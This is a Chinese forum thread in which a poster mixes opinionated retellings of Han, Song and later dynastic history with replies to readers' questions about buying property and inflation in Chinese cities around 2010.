一个农民当了教主，就有这样的眼福。换做了傻空当教主，会怎么做？ 黄巢比洪教主学问要高一些，但是屡试不第，当了私盐贩子。 从起义的第一天开始，黄巢的脑子里也从来没有过百姓该如何如何的。 他是一个彻头彻尾的投机分子，说是义军，不如说是强盗。 新唐书中说，贼军所过州县，老百姓皆烧杀殆尽。黄巢的兵可并不懂三大纪律八项注意，那是能抢救抢，抢不了就烧就杀。 无论是旧唐书、新唐书、还是资治通鉴，从头到尾，就没有出现过黄巢的一句好话。 黄巢攻陷广州，至少屠杀了十二万人，把皇帝气晕了。 皇帝还知道体恤子民呢，而黄巢就是彻头彻尾的强盗外加杀人犯。 黄巢攻进长安当了天子，充分显现了流氓无产者的本质，穷奢极欲，挥霍无度，治理国家的事彷佛就跟他没有一点关系。不搞建设就只能做吃山空，结果长安的粮食都被糟蹋完了。 长安没有余粮，黄巢就把长安老百姓抓来，煮着吃，十万大军靠吃老百姓过日子。 幸好老天开眼，官军打进了长安，结果是老百姓对官军夹道欢迎。 农民军真是义军吗？ 不但中国的农民军领袖都是杀人魔鬼的化身，就是法国资产阶级大革命领袖罗伯斯皮尔，同样也是法西斯暴政的先驱者。最后被人民送上了断头台。 只有一个真正的法制化国家，人民在法律的制约下，享有人身与财产自由，才能够安居乐业。 李自成在军队纪律上，是要比张献忠高明一点的，所以李自成打进了北京。李自成到北京后，拷贝了黄巢进长安的淫乐经验，对美女极尽淫乱之能事，对百姓烧杀抢劫做的也很出色。 历代农民军对妇女的态度与《水浒传》中梁山好汉完全相反。 施耐庵笔下的梁山好汉们似乎对妇女有天生的仇视，动不动就把女同志劈死，李逵甚至终生不尽女色，就凭这一点，我们只能说梁山好汉是农民军中的异类。 但是梁山好汉不是为了起义，而是为了招安。一群由小公务员和渔民组成的社会最底层群众梦想通过拉山头再跳槽的方式走进金字塔的中层，但是这个梦想破灭了。 古代历史上，能够治理天下的穷苦人，只有一个：朱元璋。 朱元璋 为什么朱元璋可以，而别人不可以。 经过仔细研究发现，朱元璋的人生际遇不像黄巢、张献忠和李自成，他有点像刘邦，但又有很大区别。 朱元璋是一个到处要饭吃的和尚，但是喜欢思考，见世面，交朋友，并且找到了自己的宗教信仰——明教（也叫摩尼教、白莲教）。 朱元璋走投无路投奔起义军的时候，娶了起义军濠州大帅郭子兴的义女当老婆，就是那个著名的马皇后。郭子兴并不是一个农民，而是一个大地主，所以朱元璋加入的这个新家族，思想完全不同一个扛着扁担造反的农民。 郭子兴作为农民军的统帅，却在逛街的路上，被其他的农民军兄弟（真正的农民）绑了票，大概是因为农民对地主阶级比较仇恨。最后被朱元璋救了出来。 郭子兴看见朱元璋比自己强，反而起了憎恨之心，一心想把朱元璋弄死。 朱元璋在丰富的人生经历中看到了农民起义军领袖们的鼠目寸光，要想成大事，必须有远大的理想和抱负，而这些是黄巢、张献忠、李自成、洪秀全都没有的。 朱元璋与那些个农民军领袖最大的不同在于，他熟读历史，因此他把汉高祖刘邦作为榜样。目标是建立一个基业长青的强大统一的国家。 朱元璋就懂得无论是得到天下，还是治理天下，就必须有能力的人来辅佐。嫉贤妒能的人只能被历史的车轮碾碎。 曹参治国 人们最希望的，就是在一个良好的社会环境下，安居乐业，自食其力。zf的职责就是健全法制，维护一个良好的环境，剩下的事，交给民间去做。三天两头出政策，过度插手百姓如何过日子，甚至朝令夕改，就会让百姓的正常生产生活无所适从。 早在汉朝初期，曹参已经参悟了这个道理。 曹参是刘邦当亭长时的领导，也是刘邦最亲密的战友。萧何是文官，曹参则是武将，曾经在韩信麾下效力，除了披坚执锐外，最重要的工作就是监视韩信，防止韩大军事家谋反。 这样一个万夫难敌的勇将，却在革命胜利后被分配给齐王刘肥（刘邦的私生子）当相国，主抓齐国的政务。 曹参是一介武夫，只懂得军事，并不懂治理地方，就用厚礼聘请了精通黄老之术的盖公。盖公认为：治理国家很简单，只要按照律法办事，给老百姓提供一个安全的稳定的环境，其他的都不用管，官府千万不要好大喜功，追求政绩，过多插手百姓的事物，顺其自然就好了。 曹参很赏识盖公，并且按照盖公的话去做，九年的时间，齐国变得非常繁荣。 这时候，传来噩耗，萧何挂了，皇帝刘盈聘请曹参出任相国。曹参上任以后，几乎罢免了所有办事效率高、口才好，有追求有抱负的能吏，提拔了一群只知道按部就班，照章办事的老实巴交的官员，然后就彻底大松心，成天喝酒吃肉听小曲。 很多人对曹参不满就给皇帝刘盈打小报告，刘盈的表现是很愤怒。 曹参就问刘盈：是陛下你牛呢，还是先皇刘邦牛呢？ 刘盈：当然是先皇牛 曹参又问：那我跟萧何比，谁牛呢？ 刘盈愤怒的说：你比萧何差远了。 曹参做了个总结：您讲的太对了，先皇和萧相国拟定的法令已经非常清楚了，只要贯彻执行下去就好，我只要按照他们的法令办，不就行了吗？ 刘盈虽然不事朝政，但应该算是比较聪明的君主，一听就懂：对于已经定下的治国方针大略，只要执行下去，一定会使人民休养生息，国家富足。如果大搞政绩工程，对于先皇刚死，吕后掌权时期风雨飘摇的大汉来说，将是灾难性的。 民间把成天喝酒吃肉听小曲的曹参称为贤相。司马迁在史记中也给了曹参极高的评价。 假设一个工程队要盖楼房，起初设计人员设计了20层，刚盖了两层，队长换人了，非要盖成30层，工人于是绞尽脑汁费劲办法改造。等盖到25层的时候，又换队长了，新队长说还是改成两层的别墅吧。刚把楼房都拆掉，别墅建了一半，又来了一个队长，说要建成比迪拜塔还高的大塔楼。这个楼建了n年也没建起来。 建房子跟治国的道理是一样的，我国汉代的相国曹参就已经明白了这个道理。 晁错 刚才有人提到吴楚七国之乱，讲得是晁错。晁错其人是很值得讲讲的，一个有才能的人在错误的时间做了一个理论上正确的事，却导致吴楚七国之乱，汉景帝差点完蛋。结果是景帝砍了晁错的脑袋。 这个故事，几乎家喻户晓，蕴藏的道理却很深，大家如果懒得看史料，有兴趣可以参看易中天\"帝国的惆怅\"，还是很值得一看的 民营小企业的老板和打工者 糊涂人即使把道理说的再浅显，他也听不明白，呵呵。 现在我国已经进入高通胀期，但是地方巨额债务与人民币的升值又封杀了加息的空间，经济形式有可能恶化，民营小企业的老板和打工者只能自求多福了。 汝爱之罪： 刚查了一下央行的数据，8月份的M2是68.75万亿，我没记错的话，7月份的M2控制的很好，基本没怎么涨，但是到了8月份，没想到有那么猛的涨幅，看来不到12月，我国的M2就要到70万亿了。2007年1月份，我国的货币供应量是35万亿。 今早去小摊买早点，原来一块五的加鸡蛋灌饼现在卖两块。如果涨工资，只会把通胀越推越高，如果不涨工资，P民就要忍受通胀的剥削。真是无语了 郭解 从古到今，小老百姓遇到不公，受了委屈，幻想最多的就是跳出一个大侠，劫富济贫，为自己伸张正义。所以金庸的小说广为流传，被称为成年人的童话。 我国古代，真有大侠，不过古代的大侠并不是会降龙十八掌的郭靖，也不是小李飞刀，而是黑帮的老大，相当于西方的教父。 最有名的大侠叫郭解，汉朝时有极高的威望，不然也不会写进史记。 郭解的爸爸是个职业杀手，非常有名，用古龙的话说，最厉害的杀手是没有名字的，郭解的老爸名声太大，注定活不长。有个米商请郭解的老爸到监狱里救出犯了法的儿子，郭老爸看在钱的份上去了，就再也没能回来。 郭解跟他老爸学过功夫，很有两下子，于是干起了抢劫和盗墓的这份很有前途的职业。因为功夫高，谁只要说句话让他不爱听，必然遭遇一顿暴打。本着流氓会武术谁也挡不住的精神，到了三十岁，郭解已经钱多的数不过来了。男怕入错行，女怕嫁错郎，看来抢劫和盗墓的职业选择对了。 30岁以后，郭解为了从强盗升级为教父，开始积累自己的名声，并且学习战国四公子，开始蓄养门客，但凡是哪个人有难，有求必应。俨然形成了一个严密的黑社会组织。在民间的声望，甚至超过了皇帝。 皇帝的权威是不容冒犯的，一个地方黑社会头子怎么能够这么嚣张呢？就把郭解抓了起来，虽然有大量的证据证明郭解作奸犯科草菅人命，但都是汉武帝大赦前的事情，没有办法定罪。汉武帝一筹莫展，人抓了不能定罪，又不能放掉，该怎么办呢？ 这时，正好有个书生，骂郭解不遵纪守法。正巧被郭解的门客听到了，就把那个书生给杀了。 汉武帝听了哈哈大笑，正巧找这个理由把郭解灭族。 侠客的黄金时代，从此结束 剑侠情侣，快意江湖，听着是一个充满了浪漫的世界，而事实是完全不可取，一个没有法制的社会，奉行者赤裸裸的丛林法则，什么是对？什么又是错？理由就永远站在强者一边，强者可以随自己的意愿决定弱者的生死。 这个社会是可怕的。 郭解，就让他永远埋葬吧 2010年的中国房地产 汝爱之罪： 今天跟家里人打电话，姨妈说了下近一年来老家云南东北方向一个地级市曲靖的变化。 主要就是：好些有资金的外地大佬大手笔拿地，开发酒店和商品房。都是市区的黄金地段。 其实房地产开发在中国的任何一个城市每天都在发生，不过令人感慨的是这样的\"四线\"城市也如此火爆，购买力之强令人感慨，她说最近几天曲靖正在举行房交会，人头攒动。 现在老百姓有钱都向往好的房子和户型了，已经不满足90年代的老旧房子了，而且通货膨胀也逼得大家不得不置业保值。 再回头看看北京，简直找不到跌的理由。那么多地铁要修，那么多优质生源每年涌向北京高校，那么多人口，每天要造就那么多富人。。。。 kkndme： 钱太多了，流动性泛滥，老百姓恐慌了。这次调控暂时抑制了一线城市房价的上涨势头，但是却直接导致了全国性房价的上涨，不光二三线城市，连四级以下城市都是如此。这就是领导水平。 房奴算不上不幸，相当当不了才算 lanyu1121： 普通老百姓都成房奴了。 kkndme： 成为房奴还算不上不幸，相当房奴当不了才不幸 精英人群的平均收入决定房价 skysurfer2208： 想请教一下楼主，对于很多的二线城市，比如武汉，市区房子的均价一万左右了，但当地的平均收入一般也就3000左右吧，难倒你不认为现在的房价里面有泡沫吗？特别是现在正处在调控期，对于我们这些近年打算买房的来说，是在等等看呢还是在在这个时期出手？多谢楼主 kkndme： 你所说的平均收入是什么概念？是人人都挣3000块，还是有人挣2000块，有人挣1万块。武汉的房价，要看湖北省包括各地市的人口，家庭收入上万的人有多少，如果你认为很少，几乎没有，那房价肯定存在泡沫。如果湖北省有20%的人口家庭月收入超过万元，那么武汉市区的房价就没有泡沫。 内地不是香港、海南 johny__： 那香港97年的时候还不是一样跌了一大截，按LZ的说法，1）土地资源很稀缺；2）作为消费群体的白领收入也能买房；3）作为世界城市，更是汇聚了世界级精英的购买力，仿佛现在上海。最后，不是一样大跌？？中产都成了负资产了。就连林百欣的儿子林建岳97年以69亿港元高价购入中环富丽华，还不是赔得一塌糊涂。 楼价涨高了就要跌，哪都不例外，这个才是规律。什么通涨，精英购买力决定房价，都是涨了之后在找理由。 kkndme： 这就是体制上的不同啊，所以我们无法重复香港和日本。97年的金融风暴，还是中国以国家之力对抗索罗斯的量子基金，保住了香港，这种行为在西方国家是难以想象的。一个国家动用全国人民的外汇储备与美国的民间资本打一场战争，这是令全世界震惊的。索罗斯因为不了解中国的体制，悻悻而归。 人民币不能在世界流通，依照我国实行的货币制度，货币只不过是一种符号。如果有一天我们的人民币能够自由兑换，香港发生的事也一定会发生在我们身上，但你认为我们的人民币能够自由兑换吗？ johny__： 那92年的海南崩盘有从何说起？从7000多掉到了几百元，这难道是海南体制？发币行是海南银行？同样是国内，同样的外汇管理制度，不是日本也不是香港，是中国海南。 --据《中国房地产市场年鉴（1996）》统计，1988年，海南商品房平均价格为1350元/平方米，1991年为1400元/平方米，1992年猛涨至5000元/平方米，1993年达到7500元/平方米的顶峰。短短三年，增长超过4倍。 --海峡对岸的北海，沉淀资金甚至高达200亿元，烂尾楼面积超过了三亚，被称为中国的\"泡沫经济博物馆\"。 [经验交流]92年海南房地产泡沫始自于\"击鼓传花\"(转载) http://www.tianya.cn/publicforum/content/house/1/163988.shtml kkndme： 全国的资金去炒海南、北海，炒的纯粹是概念，没有实体的支撑，就是一种博傻游戏。今年年初海南房地产的爆炒，同样积聚了巨大的风险。买房并不是全无风险，好比通州、燕郊，经历疯狂的炒作一定会理性的回归。但是如果指望北京四环内房价下跌，也只是痴心妄想。 房产投资也不是随便买套房就只涨不跌，比如说山东乳山的房子，开发商疯狂炒作旅游地产概念，但如果真的想投资升值，那就成了天大的笑话，因为根本无法变现。 什么样的房产适合投资，投资者不是傻子，都会有理性的判断。 90年代初的强硬调控让海南和北海的经济崩盘，对全国来说不可怕，毕竟只是一隅之地，但是如果用粗暴手段搞崩了全国，zf一定会好好掂量的。 历史是一面镜子 如果以为本帖讲的历史故事，那就完全理解错了。 本帖讲得不是历史，而是总结前人的经验，讲得是故事背后的道理。 如果毛不是熟读历史，也不可能取得胜利。毛在进京的时候，说过一句话：我们不学李自成。 只有认真总结过李自成失败的教训，才能够做出正确的选择。 买房一次性到位比较好 包容会通： 我老婆是长春人,岳父母退休,都有退休金.我和我老婆现在都在国外,准备3年以后回长春工作,我们现在有40万的现金,放在银行也没什么用,也担心3年以后,长春的房价还要涨. 因此,现在准备用其中的20万作首付买套70平的小户型的,让岳父母住(岳父母有住房,但很快就要拆迁了).等3年以后回长春,把这套小的卖了换成大的.不知这样的计划是否可行?贷款如何弄? 谢谢兄弟. kkndme： 既然是自住型需求，何不买套大点的，70平（建筑面积）的房子无论是自住、父母住还是合住，都比较拥挤。既然有40万的闲钱，还是一次到位比较好，3年后长春的房价一定要比现在高的多。 只是贷款比较麻烦，你的父母是无法贷款的，除非你们夫妻能够回国，这种事用别人的名字办肯定是不行的，房价上涨后就有可能会陷入扯皮甚至打官司的境地。 外汇管制 tianxiaobing11： 楼主，这个tj连人民币不能自由兑换都不知道，可见他的水平也太差了，就不用和他计较了，从上个月开始人民币换美圆好象收紧了，是怕民众把人民币换美圆出逃吗？ kkndme： 外汇外流趋势比较严重，zf开始严管，包括携带50美元以上商品入境必须征税等措施，都是限制外汇外流。富人从穷人身上赚了钱，换成美元在国外消费，这是zf不愿意看到的，zf不在意富人搜刮穷人，但肉一定要烂在锅里 一线和二线 yamazaki28： 楼主好，小弟有问题请教，本人所在二线省会城市，存款40w,近来看中本市CBD区域高端住住宅一套，各方面条件十分优越，面积100左右，均价18000。但通过观察，又看中觉得北京五环附近的待建地铁房，均价16000，想贷款弄小户型60左右，不知哪个升值潜力大，本人已有房一套。谢楼主指点。 kkndme： 短期来看，二三线城市的房产升值速度要高于北京，这是这次调控造成的结果，从长期来看，北京房产的升值速度要高于二三线城市。五环附近地铁房，还是很有优势的。 吕后篡权 大凡是60年代末，70年代初生人，小时候肯定看过一本小人书：吕后篡权。 在那个时代推出这本书，很有寓意，起到了很好的宣传效果。 吕后真的是十恶不赦的妖妇吗？让我们还原历史的真相。 我们读到的吕雉，通常的形象是蛇蝎心肠的女强人。 大家感兴趣的，首先是关于吕雉在项羽大营和审食其是否有一腿。 然后看到的是吕雉协助刘邦诛杀异性王、与倾国倾城的戚夫人争宠、帮助儿子刘盈与戚夫人的儿子刘如意争夺太子、杀害戚夫人和刘如意、提拔吕氏家族成员。 但是因为宣传的需要，几乎所有人都忽略了吕雉的另一面 刘邦见上帝以后，吕雉掌权期间，对待老百姓还是很够意思的。 俗话说嫁出的女就是泼出去的水。吕雉可不同，吕雉非常照顾自己的娘家人，想把自己的娘家人都提拔起来。 秦始皇把分封制改成郡县制，搞天下大一统，意识比较超前，结果政权不稳定，秦朝很短时间就完蛋了。高祖刘邦吸取了这个教训，仍然搞分封制，不过分封制做了重大的改革:首先是分封的诸侯王必须是皇族，也就是说必须姓刘。其次是从中央派丞相给诸侯王，丞相掌握诸侯国的军政大权，防止生变。 吕雉提拔娘家干部最大的障碍就是：高祖说过，诸侯王只能姓刘。 吕雉是一个极其精明的女人，她追尊自己的老爹吕公为宣王，吕公是刘邦的老岳父，追尊皇帝的老岳父，旁人自不能有异议。既然有了先例，剩下的事就好办了，吕雉趁机把自己吕姓家族的成员封为吕王。 吕王吕嘉这个人很嚣张，仗着外戚的身份，飞扬跋扈，不尊法纪。 吕雉是一个出色的国家领导人，不是黄巢李自成之类的强盗流民，是很关心民生的，所以很生气，把吕嘉给废了，让吕嘉的叔叔吕产当吕王。 吕雉掌权后，做了很多亲民的好事，减免老百姓的税赋，加强建设健康的人民文化娱乐，最受百姓欢迎的是废除了\"三族罪\"和\"妖言令\"。 三族罪的意思很直白，就是一人犯罪株连三族。 妖言令有点象后来的文字狱，哪里出现统治者认为的妖言，就把那个地方的所有百姓全部处死。这是一个伟大的历史进步。 吕雉还是女权运动的先驱者，在吕雉时代，女子也可以封官封侯，可以随意离婚再嫁。那个时代是中国古代史上，女人最幸福的时代之一。 吕雉，一个柔弱的女子，在残酷的宫廷政治斗争中表现的异常凶狠，然而权力的斗争本身就是你死我活，在治国方面，吕雉却无愧于一个贤明的统治者，可谓巾帼不让须眉。吕雉与后来的老佛爷完全就不是一个等级，毫无可比性。 吕雉执掌朝政十五年，直到病死后，吕氏家族才土崩瓦解。 还原真实的历史，我们不应该对这位叱诧风云的女政治家，致以深深的敬意吗？ 小产权房 大水牛跟水牛仔： 楼主,可以谈谈小产权房的看法吗?父母是珠海的原居民且拥有两套小产权房,无房产证只有村里所发的使用证,是村委会卖给原居民的,离市中心约半小时车程,近河边,而一路之隔的位置己建有大型高尚住宅小区,在售价一万二以上,请问这些小产权房可靠吗?听说往后政府对这些小产权房采取放宽政策,只需补一点钱就可改成商品房,你觉得有可能吗? kkndme： 这个补点钱就改商品房的可能性不大，如果是大片的小产权房，拆的可能性也不大。这个问题很让zf头痛，城乡双轨制的结果，所以zf能拖就拖。 但是对于片区不大的小产权房，风险就很大 大水牛跟水牛仔： 谢谢楼主回复,父母手上的两套小产权房在同一小区,小区比较大,这类小区有好几个,由于村内将进行旧村改造,规划成高级住宅片区,那此类小产权房如遭迁拆的话会得到赔偿吗? kkndme： 这个会比较扯皮，最坏的情况是按照原价退赔，最好的情况是回迁安置。如果原价退赔损失就很大。 商铺和住宅 deeplp： kkndme 兄，你好。 从这个帖子一开始就一只跟着，每天必看。受益良多。 你对广州感觉如何？请教一个问题，不知你对商铺是否有研究？你觉得眼下投资商铺好呢，还是继续投资房产。 本人已有2套房产，都在广州市区且近地铁但不带很好学位。现有如下两个想法， 1. 分散投资，投资一个商铺，目前看中一个广州北京路拐弯处二楼商铺一个，靠近地铁。 2. 继续房产，买一个130以上大户型且带学位房，方便以后小孩读书。（计划明年要小孩，现在就做打算是怕以后买不起阿。） 麻烦兄台给些意见。十分感谢。 kkndme： 找到合适的商铺是很难的，因为商铺投资风险大，所以非常考验个人的眼光，属于高风险高回报，找对了，将财源滚滚，找错了很可能血本无归。 如果你有眼光，首选商铺。如果不具备这方面的能力投资住宅比较保险。 体制内外 tuzi1976： kkndme兄，你好。上周提了几个问题，可能你没看到，再请教一次，请抽空指点一二。 看到楼主说过\"人民币对外是升值，对内贬值\"，我认识到\"人民币对外是升值，对内贬值\"这一点也有一年多了吧，主要是从生活经历、经济新闻中得到的结论（本人学工科、不懂经济）。虽然看到了表面现象，但对其发生的根本原因、对群众生活的深刻影响、\"中产阶级（勉强算是有这么个阶级）\"的应对之策等等尚没有深刻的认识。楼主看到我提的这些问题恐怕也觉得范围太大、难以回答？难道体制外的\"中产阶级\"只有任人宰割、移民海外、钻营往上爬这几个选择？诚心求教，风险自担（呵呵，楼主也不是神仙） kkndme： 普天之下莫非王土，决定了今天的土地国有 万般皆下品，也决定了以后知识分子的前途必须进入体制内。 不能考中进士的明清两代知识分子，即使经商发了大财，也一样让人看不起，不能光宗耀祖。今天的知识分子将面临同样的命运。 体制外，凭个人的本事和运气，自生自灭。 2010年的上海 youme5845： 看到LZ的帖子真是太及时了！因为要解决小孩子上学，我最近开始密集型的看房子. 感慨房价高的同时后悔没有早点考虑买房。头痛啊！！！ 说说我们的情况：目前现金40W,家庭收入1W5,住上海，目前看的房子为周边世纪公园地铁10分钟老公房(新房很少)，81P 190W,地段很好，但房子都是95年左右的了。算下来除了首付家里帮助外每个月供5K还30年(扣除公积金还款),我们现在可以出手么？还是等十一新政策出来后买？ 还是在交通稍微不便的地方买低价的房子？ 请LZ给个意见~ 在线等~ 多谢！！！！ kkndme： 月供5k,收入1万5，说明的你的压力不大，完全可以承受。如果地段好，可以不考虑房子的新旧。一线城市的买房时机最不好拿捏，因为一线城市是调控的目标，你要仔细观察，如果发现中介的铺面里看房客越来越多，建议赶紧下手。 youme5845： 多谢！！！ 那我最近关注多一些！ 还有这块小区同时是学区房，是否可以买个100W出头的出租，然后自己租房住(我们长期租住房租很便宜 1700两室户)，这样即使以后出现金融危机等情况也不会担太大风险，是这样么？ kkndme： 对自己好一点的就会自己住，对钱看的比较重，可以买房出租，自己租便宜的。因人的性格而已。 不过人生苦短，在短短的有生之年，还是要对自己好一点。自己买的房子住起来跟租房子的感觉是完全不同的。 收紧住房贷款 welldayzwb： 顶楼主，越读越觉得受益良多 楼主分析一下，最近几年一线城市是否会一直收紧贷款，想改善住房是否也得必须全款了？一想起这个就很郁闷，去年机会没利用好，后面不仅仅是经济成本的问题了，又面临和无房空空类似的问题，攒钱永远赶不上房价了。。。 kkndme： 收紧住房贷款起码在未来的一段时间会成为常态。由于货币泛滥，一次性付款的人群数量庞大，收紧贷款虽然不能降低房价，但可以抑制房价上涨的速度，防止商品房卖给穷人，以规避金融风险，对社会稳定和经济平稳增长都是有利的。 买房：物业与房贷 fallenleafe： 关注本贴多日，非常欣赏楼主的睿智和理性。 小女子也是上海众多买房人之一，目前所谓单身剩女，得家人支持有一百五十万的首付金。基本确定买在内环交通方便的次新房（老公房停车太成问题）。 对上海浦西内环内的诸多区位和楼盘做过研究，发现离地铁近的同时能有苏州河景观的房源最具性价比，满足交通性和景观稀缺性的双重优势（上海内环内几乎没什么安静同时又具有自然资源的地方）。 现在基本确定了两个小区，比较纠结的问题有两个。 第一个问题，一个是小区管理和区位优势明显单价在3万3左右，另一个区位和管理比较差，名声不好，但是面苏州河的独一无二景观，单价在3万左右。从小区管理的角度，我也认可楼主的看法，管理好的小区升值空间大，管理差的小区由于群租问题严重，目前价格偏低，但是这个软件问题在日后随着自住率的提高貌似也能解决。究竟我该选一个景观资源非常稀缺的管理和配套相对较差的小区，还是一个相对成熟价格稍高同时综合配套比较好的小区？那个小区比较有保值和投资优势？ 第二个问题，目前的月收入税后刚过万元，如果拿150万的首付买一房大概80平左右，是比较轻松的，月供不成问题（目前租的一室一厅租金3500，已经可以做为还贷资金了）。但是考虑长远问题和一些小户型的局限性，非常想投资一套能长久居住的两房甚至三房（众所周知，一个小区里好的位置总是留给最大的户型）。这样的话，大概一套就要在320万甚至350万，我需要每月还贷1万2左右，基本和我的月工资持平。从个人观点来看，我比较想冒这个风险，比较合适的做法是首付降低到3成左右，留出三十万左右的还贷资金用以应付前面两至三年的还贷。由于目前单身，两至三年后也许家庭收入就可以完全承受这个月供。即使还是单身，目前事业发展良好，对2年后的收入在2万以上很有信心，因此还是认为可以目前阶段多点勇气，目光长远，以保证日后生活安康。 不知道楼主怎么看这个问题？如果是房价持续上涨的情况，也许更该相信我的工资也会持续上涨，是否我看问题太乐观？贷款200万的风险是不是会太大？ kkndme： 第一个问题：物业管理对于小区的价值起着至关重要的作用，好的物业管理才能让人居住舒适，这一点是非常重要的。软件的提升往往比硬件的提升难度更大。物业很差的景观楼盘，可以比喻为鲜花丛中的一坨屎，周边环境再好，它也是一坨屎。一坨屎能否脱胎换骨变成黄金，存在着较大的不确定性。 第二个问题：是否承受较高月供，取决于你对未来的预期，所以你要仔细分析你的行业前途，如果你所处的行业告诉成长，或者你的能力职位将得到进一步提升，你可以承受较高的月供。 一般来说月供不要超过全部收入的70%，如果超过这个边际，就会有较大风险。 奸臣蔡京 现代的纸币发行成本很低，拿着印钞机印就是了。古代就没那么好办，金银的开采量是有限的，别说金银，就是铸铜钱用的铜，也不是想要多少就有多少。 古代要想制造通货膨胀，最绝的办法就是拿一个铜钱当十个铜钱花，叫做当十大钱。搞当十大钱，扰乱货币秩序的领导，最有名的就是蔡京。 蔡京这个名字并不陌生，不爱读历史的人也一定看过水浒传。就是这个领导，被宋史称为六贼之首。大家一提起他，就自然把他跟奸臣划了等号，恨不得在他脸上踹几脚。 蔡京的确是个奸臣，但很多人可能不知道的是：蔡京是王安石的最得力干将，他的很多祸国殃民的政策，竟然是源于恢复王安石的变法。 王安石可以说是一个品德高尚的人，但是变法的流毒，竟直接导致了北宋的灭亡。王安石是一个在历史上有争议的任务，但是他的得力骨干蔡京同志，却是不折不扣的奸臣。 蔡京领导的罪恶，大家一致公认的就是那么几条 第一、花石纲，水浒传有精彩的描述，这个纯属于皇帝的个人爱好，似乎都推到蔡领导身上比较冤枉。 第二、大兴土木，大搞基础设施建设拉动内需，顺便搜刮点民财，以至于百姓怨愤 第三、恢复王安石时期的方田法，并且更改盐法茶法，国库和官员一起大肆搜刮民财，与民争利，结果租税混乱，富人把负担全部转嫁给穷人，穷苦百姓的负担更加沉重。 第四、就是当十大钱，制造通货膨胀，严重扰乱金融秩序和金融安全，北宋的经济崩溃了 蔡京，一个王安石变法的坚定执行者，最后成为祸国殃民的奸贼。 关于蔡京的奸臣形象，到了现在，有人企图为他翻案。但终究声音比较弱小。 因为在中国的古代，肆意敛财、大兴土木、搞官商垄断，与民争利，以至于人民不堪重负的领导，都被称为奸臣。对于减轻人民赋税，不胡乱插手民间生产和贸易，让人民修养生息的，被称为贤臣。 中国的古代，奸臣远远多于贤臣。 体制内的28原则 facetowall： 有人说，高校里20%的人掌握着80%的资源和财源，本人深有同感。所以经常想怎样才能成为20%里面的人。每天也很努力工作着，科研教学也可以，但是总看不到希望。 kkndme： 从一个小吏变成中高级干部，是需要深入研究中国古代政治斗争史的。否则就变成了宋江，企图另立山头通过跳槽达到目的，最终的结果只能是失败。宋江是一个政治上的白痴。 还有一个白痴叫贾谊，我们所熟知的\"过秦论\"的作者，才高八斗，政治却很白痴。被文帝做了棋子。如果贾谊同志知道晁错的下场，是无论如何不会仗着有才胡说八道，口无遮拦的 贾谊 贾谊的粉墨登场，是有很深的政治大背景的。 首先要从吕雉死翘翘，以陈平、周勃为首的功臣集团铲出了吕氏一党说起。 吕氏一党灰飞烟灭，小皇帝是个吕雉制造出来的傀儡，甚至跟高祖刘邦都没有任何血缘关系。 难题是让谁当皇帝呢？ 于是中国历史上最为搞笑的一幕发生了，在高祖刘邦的子孙中要搞最弱外戚选举。 大概是被吕雉专权搞怕了，大家推举皇帝，专门看哪个皇子的外戚弱。于是众人的目光投向了刘邦的第四个儿子，代王刘恒。原因是刘恒的母亲薄氏出身低微，为人又很低调，堪当最弱外戚之名望。 提起薄氏，野史里记载的很香艳，很可以拍三级片 野史里说，楚汉争霸时期，高祖刘邦大败。 薄氏还是个姑娘的时候叫薄姬，逃难的时候占领了一个无人居住的民宅。忽然有一天看见一个浑身是血，穿着盔甲拿着兵器的男人闯进了自己的屋子，这个人就是刘邦。 薄姬听到后面有追兵，就把刘邦的盔甲和兵器藏了起来。然后放了一大桶洗澡水，把自己和刘邦脱光光，洗起了鸳鸯浴。追兵闯了进来，惊奇的看了一通三级片，然后走人。 这个只是野史，可信度不高，但是说明了薄氏的低微出身。 不管怎麽说，有着最弱外戚称号，并且做事很低调的刘恒当了皇帝。但是对于刘恒来说，陈平、周勃等功臣集团有着很高的声望，齐王刘襄是高祖长孙并且在铲除吕党是很有功劳，声望也很高，受到了很多人的支持，而刘恒却毫无功劳，因为功臣集团平衡关系，天上掉下了皇帝的帽子，砸在自己脑袋上。 所以刘恒必须提拔自己人，这个人不能有很高的功劳，也不能有结党的嫌疑，最好比较有本事能治理国家，于是大才子贾谊粉墨登场了 贾谊同志很有口才，一腔热血，要到现在来说最适合搞传销或者卖保险。 贾谊同志激愤起来甚至说：自己完全可以带兵打仗，灭了匈奴，把匈奴王象狗一样牵回来。\"刘恒很贤德，但也很老谋深算，当然认为贾谊同志满嘴喷粪，所以一笑置之。 贾谊同志的胆子不是一般的大，向皇帝刘恒提供了一个深的帝心的建议：让所有的诸侯王滚回自己的封地。 为什么说这是深得帝心的建议？因为朝里功劳大的人太多，居功自傲，而自己却没有什么威望和功绩，如果功臣集团和齐王、淮南王联合起来造反怎么办？ 所以，最好的办法就是让诸侯王滚回封地。汉代的诸侯王可跟周朝不同，周朝的诸侯王是有实权的，有自己的军队。而汉代的诸侯王只能收收领地的税，军政事务全说了不算。 这个事，从贾谊嘴里说出来最好不过。 汉代的京城是最繁华的，有全国最好的教育、医疗、商业，有钱人的天堂，大臣们都可以花天酒地。让诸侯王回到封地，大家都不干了，回封地有什么好？房价又低，又没什么娱乐，漂亮姑娘也不好找，偏远的地方气候还不好，梅雨一来全身都要发霉。 首先带头反对的是功臣集团的领袖周勃（陈平已经死翘翘了）。在历朝历代，多数皇帝并不是想干什么就干什么的。既然所有大臣都反对，那就先暂且作罢。 但是贾谊，已经为刘恒种下了希望的种子，给自己埋下了祸根。 贾谊注定了只能是一颗棋子。 贾谊的建议没有被采纳，估计很郁闷，成天滔滔不绝的演讲，甚至建议刘恒削藩，要是贾谊知道晁错的下场，一定不敢这么建议。 这时候，贾谊已经得罪光了朝中几乎所有的大臣。于是大家的不满全部转移到贾谊的身上。 刘恒要的就是这个效果。 随着政权的逐渐稳固，刘恒把矛头指向了周勃。给予周勃最高的赏赐，却经常在治理国家方面，询问一些周勃不可能知道的问题。让周勃很尴尬。 周勃有个门客，就对周勃说：\"皇帝经常给你很多赏赐，您就安心的接受，这很危险。皇帝给你的赏赐越多，说明皇帝对您越不放心啊。\" 功高震主，弄不好会有杀身之祸，周勃不是傻子，立刻明白了这个道理。所以周勃才能称的上除曹参外，最有政治头脑的武将，最后得了善终。 于是周勃就上表辞职，表示年老体病干不动了。周勃还期望皇帝能挽留一下，但皇帝一点挽留的意思都没有，立刻同意了。 刘恒让周勃起个带头作用，回到自己的封地去吧。并且赐予了大把的金银。其他诸侯王看周勃都走了，也扛不住了，只好都回到了封地，这叫射人先射马，擒贼先擒王。 刘恒为了安抚大家，把遭人恨的贾谊明升暗降，贬到了长沙，从此离开了政治中心。 